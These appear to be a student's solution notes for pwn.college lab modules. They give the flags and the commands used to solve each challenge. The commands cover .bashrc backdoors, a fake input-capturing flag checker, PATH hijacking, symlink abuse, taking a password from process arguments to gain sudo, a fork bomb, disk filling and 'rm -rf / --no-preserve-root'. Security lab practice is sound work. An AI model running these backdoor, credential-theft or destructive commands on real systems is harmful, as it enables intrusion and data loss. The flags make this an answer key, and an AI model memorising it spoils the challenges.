# Module 15: Silly Shenanigans


### Bashrc Backdoors

Flag: pwn.college{gCGQC1Du5QmjC9ehYAj0ePPIsKf.0VMzEzNxwSM2QjM1EzW}

Solution:
nano /home/zardus/.bashrc

cat /flag > /tmp/flag.txt

/challenge/victim

### Sniffing Input

Flag: pwn.college{4ebSWQaGykZE-nHkh-pMohnyeNx.0VNzEzNxwSM2QjM1EzW}

Solution:
#!/bin/bash

echo "Type the flag"

read FLAG

echo $FLAG > /tmp/flag.txt

echo $FLAG

chmod +x /home/hacker/flag_checker

nano /home/zardus/.bashrc

export PATH=/home/hacker:$PATH


### Overshared Directories

Flag: pwn.college{83XwzT836KlzafxgWELa9cFzrbF.0FM0EzNxwSM2QjM1EzW


Solution: 
rm /home/zardus/.bashrc

echo 'export PATH=/home/hacker:$PATH' > /home/zardus/.bashrc

/challenge/victim

cat /home/hacker/flag.txt


### Tricky Linking

Flag: pwn.college{MBNv_2qTDlUSfMUBV7ygIJJlEpL.0VM0EzNxwSM2QjM1EzW}

Solution:
rm /tmp/collab/evil-commands.txt

ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt

/challenge/victim

/challenge/victim


### Sniffing Process Arguments

Flag: pwn.college{sZDOur08WOEVTsEtVI1Q0j_ZYbj.0FOzEzNxwSM2QjM1EzW}

Solution: 
ps aux | grep zardus

su zardus

pw_5915353

sudo cat /flag


### Snooping on Configurations

Flag: pwn.college{AcWoXhRLfQtUhQsl_v6SrVMamUi.0lM0EzNxwSM2QjM1EzW}

Solution: 
cat /home/zardus/.bashrc

export FLAG_GETTER_API_KEY=sk-1499526691

flag_getter --key sk-1499526691


# Module 16: Daring Destruction

### The Fork Bomb

Flag: pwn.college{QZ9XDs5-kHIvQles_AYKJcKYStw.0VMyEzNxwSM2QjM1EzW}

Solution: 
/challenge/check

nano bomb.sh

#!/bin/bash

./bomb.sh &

./bomb.sh &

chmod +x bomb.sh

./bomb.sh


### Disk-Space Doomsday

Flag: pwn.college{Ah0REJT7FDJDSqu3wV_wUPO432h.0lMyEzNxwSM2QjM1EzW}

Solution: 
yes > bigfile

/challenge/check

rm bigfile

/challenge/check


### rm -rf /

Flag: pwn.college{M9j9prcGavnzKJbrzA1lg7yy5El.0lMzEzNxwSM2QjM1EzW}

Solution: 
/challenge/check

rm -rf / --no-preserve-root


### Life After rm -rf /

Flag: 

Solution: 


### Finding Meaning after rm -rf /

Flag: 

Solution: 
